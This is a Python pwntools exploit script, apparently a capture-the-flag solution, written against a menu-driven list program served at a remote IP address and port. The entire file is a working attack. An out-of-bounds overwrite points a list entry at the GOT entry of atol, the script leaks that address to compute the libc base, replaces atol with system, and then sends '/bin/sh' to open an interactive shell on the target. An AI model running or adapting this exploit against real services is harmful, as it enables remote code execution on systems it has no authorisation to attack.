from pwn import*
p = process('./main')
p = remote('47.103.214.163',20303)
elf  = ELF('main')
libc = ELF('libc-2.23.so')
def create(size):
	p.sendlineafter('>','1')
	p.sendlineafter('List count: ',str(size))
def show(index,item):
	p.sendlineafter('>','2')
	p.sendlineafter('List id: ',str(index))
	p.sendlineafter('Item id: ',str(item))
def edit(index,item,num):
	p.sendlineafter('>','3')
	p.sendlineafter('List id: ',str(index))
	p.sendlineafter('Item id: ',str(item))
	p.sendlineafter('New number: ',str(num))
def overwrite(index,star,end,num):
	p.sendlineafter('>','4')
	p.sendlineafter('List id: ',str(index))
	p.sendlineafter('Star id: ',str(star))
	p.sendlineafter('End id: ',str(end))
	p.sendlineafter('New number',str(num))
atol_got = elf.got['atol']
atol_offset = libc.symbols['atol']
system_offset = libc.symbols['system']

create(4)
create(4)

edit(0,0,5)
overwrite(0,3,6,atol_got)
show(1,0)
p.recvuntil('Number:')
atol_addr = int(p.recvuntil('\n',drop=True),10)
log.success('Atol_Addr:\t' + hex(atol_addr))
libc_base = atol_addr - atol_offset
system = libc_base + system_offset
edit(1,0,system)

p.sendlineafter('>','3')
p.sendlineafter('List id: ','0')
p.sendlineafter('Item id: ','0')
p.sendlineafter('New number: ','/bin/sh\x00')
p.interactive()

